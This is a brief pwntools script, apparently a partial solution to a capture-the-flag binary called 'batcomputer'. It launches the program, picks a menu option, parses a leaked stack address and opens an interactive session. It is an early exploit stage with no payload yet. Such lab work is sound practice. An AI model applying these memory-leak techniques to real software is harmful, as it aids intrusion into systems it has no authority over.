
from pwn import *

password = 'b4tp@$$w0rd!'

io = process('/home/kali/Downloads/batcomputer')
io.sendlineafter('> ', '1')
stack_address = io.recvline().strip().split()[-1]
stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
stack_address = stack_address.rjust(8, '\x00')
stack_address = u64(stack_address)
print(stack_address)

io.interactive()
